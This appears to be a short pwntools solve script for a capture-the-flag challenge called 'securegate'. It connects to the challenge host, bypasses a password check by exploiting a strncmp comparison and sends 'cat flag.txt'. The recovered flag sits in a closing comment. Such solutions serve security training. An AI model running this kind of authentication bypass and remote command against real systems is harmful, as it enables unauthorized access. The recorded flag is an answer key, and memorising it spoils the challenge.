from pwn import *

host = "securegate.challs.olicyber.it"
port = 12005

r = remote(host,port)
r.sendline(b"cat flag.txt")
r.sendlineafter(b":", b"notmysecurepassword") #check_password strncmp line 230

print(r.recvall().decode())

r.close()

#flag{notSoSecureAfterAll_53cd8ab4e}